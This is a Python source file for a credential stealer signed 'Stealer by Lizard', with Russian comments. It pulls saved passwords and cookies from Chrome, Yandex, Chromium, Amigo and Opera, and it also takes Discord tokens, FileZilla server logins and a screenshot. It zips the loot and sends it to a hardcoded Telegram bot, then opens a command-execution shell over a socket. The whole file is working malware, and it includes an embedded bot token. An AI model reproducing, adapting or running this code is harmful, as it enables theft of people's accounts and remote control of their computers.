import os
import sqlite3
import win32crypt
import telebot
import shutil
import requests
import zipfile
import base64
import xml.etree.ElementTree as entree 
from PIL import ImageGrab
import socket
import requests
# Содержит имя пользователя
username = os.getlogin()
# верефицируем сертификат
session = requests.Session()
session.verify = False


# Переменные для работы с ботом Telegram
token_bot = "873580837:AAHEfeycsY4knw4-IQfndOo_rSlg4bkzsm0"
bot_telega = telebot.TeleBot(token_bot)


# Воруем пароли и логины из хрома

def Chrome():
    text = "Stealer by Lizard\n\nPasswords Chrome: " + "\n" # Автор стилера
    text += 'URL | LOGIN | PASSWORD:' + '\n' # Логи идут в таком формате.
    if os.path.exists(os.getenv('LOCALAPPDATA')+'\\Google\\Chrome\\User Data\\Default\\Login Data'): # Ищем файлы Login Data
        shutil.copy2(os.getenv('LOCALAPPDATA')+'\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        conndb = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') # Начинаем работать с sqlite базой
        cursor = conndb.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins') # Вытаскиваем Ссылку, логин, пароль
        for results in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(results[2])[1].decode() # Расшифровываем данные
            login = results[1]
            url = results[0]
            if password != '':
                text += url + ' | ' + login + ' | ' + password + '\n' # Добавляем данный в переменную
    return text
    file = open(os.getenv("APPDATA") + '\\ google_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
    file.write(str(Chrome()) + '\n')
    file.close()

# Теперь воруем куки из хрома.

def Chrome_cockie():
   textc = "Stealer by Lizard\n\nCockies Chrome: " + "\n"
   textc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textc
file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+") #данные
file.write(str(Chrome_cockie()) + '\n')
file.close()

# Воруем куки из Yandex Браузера:
def Yandex():
   texty = 'Stealer by Lizard\n\n\nYANDEX Cookies:' + '\n'
   texty += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           texty += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return texty
file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")#данные
file.write(str(Yandex()) + '\n')
file.close()
#Пароли браузеров на основе Chromium:
def chromium():
   textch = '\n' + 'Stealer by Lizard\n\n\nChromium Passwords:' + '\n'
   textch += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textch += url + ' | ' + login + ' | ' + password + '\n'
               return textch
file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")#данные
file.write(str(chromium()) + '\n')
file.close()

# Куки браузеров на основе Chromium:
def chromiumc():
   textchc = '' 
   textchc += '\n' + 'Stealer by Lizard\n\n\nChromium Cookies:' + '\n'
   textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textchc
file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")#данные
file.write(str(chromiumc()) + '\n')
file.close()

# Пароли Amigo:
def Amigo():
   textam = 'Stealer by Lizar'+'\n'+'Passwords Amigo:' + '\n'
   textam += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textam += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\amigo_pass.txt', "w+")#данные
file.write(str(Amigo()) + '\n')
file.close()

# Cockies Amigo:
def Amigo_c():
   textamc = 'Cookies Amigo:' + '\n'
   textamc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textamc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textamc

file = open(os.getenv("APPDATA") + '\\amigo_cookies.txt', "w+")#данные
file.write(str(Amigo_c()) + '\n')
file.close()

# Passwords Opera
def Opera():
   texto = 'Passwords Opera:' + '\n'
   texto += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
       shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\n'

file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")#данные
file.write(str(Opera()) + '\n')
file.close()

# Opera cokcies
def Opera_c():
    textoc = '\n' + 'Cookies Opera:' + '\n'
    textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
      cursor = conn.cursor()
      cursor.execute("SELECT * from cookies")
      for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textoc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textoc

file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")#данные
file.write(str(Opera_c()) + '\n')
file.close()

# discord session
def discord_token():
   if os.path.isfile(os.getenv("APPDATA") + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
       token = ''
       conn = sqlite3.connect(os.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage")
       cursor = conn.cursor()
       for row in cursor.execute("SELECT key, value FROM ItemTable WHERE key='token'"):
           token = row[1].decode("utf-16")
       conn.close()
       if token != '':
           return token
       else:
           return 'Discord exists, but not logged in'
   else:
       return 'Not found'
ds_token = discord_token()
ds_token += 'Discord token:' + '\n' + discord_token() + '\n' + '\n'

file = open(os.getenv("APPDATA") + '\\discord_token.txt', "w+")#данные
file.write(str(discord_token()) + '\n')
file.close()

# Filezilla session

def filezilla():
   try:
       data = ''
       
       if os.path.isfile(os.getenv("APPDATA") + '\\FileZilla\\recentservers.xml') is True:
           root = entree.parse(os.getenv("APPDATA") + '\\FileZilla\\recentservers.xml').getroot()

           for i in range(len(root[0])):
               host = root[0][i][0].text
               port = root[0][i][1].text
               user = root[0][i][4].text
               password = base64.b64decode(root[0][i][5].text).decode('utf-8')
               data += 'host: ' + host + '|port: ' + port + '|user: ' + user + '|pass: ' + password + '\n'
           return data
       else:
           return 'Not found'
   except Exception:
       return 'Error'

textfz = filezilla()
textfz += 'Filezilla: ' + '\n' + filezilla() + '\n'

file = open(os.getenv("APPDATA") + '\\filezilla.txt', "w+")#данные
file.write(str(filezilla()) + '\n')
file.close()


screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

# CMD SHELL ACCESS
def ExecuteCommands(command):
    output = os.popen(command).read()
    return output

# MAIN SHELL ACCESS

def Connection():
    host = 'localhost'
    port = 4444 
    while True:
        try:
            soc = socket.socket()
            soc.connect((host,port))
        except:
            break
        while True:
            try:
                data = soc.recv(1024).decode()
                output = ExecuteCommands(str(data))
                if len(output) == 0:
                    soc.send(''.encode()) # Если р-тат пуст.
                else:
                    soc.send(output.encode())
            except:
              break
    soc.close()



# Cохраняем все данные в архив
zname=r'LOG.zip' #создаем переменную - название и местоположение файла
#создаем архив
newzip=zipfile.ZipFile(zname,'w')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\yandex_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\amigo_pass.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\amigo_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\opera_pass.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\opera_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\discord_token.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\filezilla.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\sreenshot.jpg')
newzip.close() #закрываем архив

log_stealed = open("LOG.zip", 'rb')
bot_telega.send_document(1015797417, log_stealed)
#time.sleep(5)
Connection()
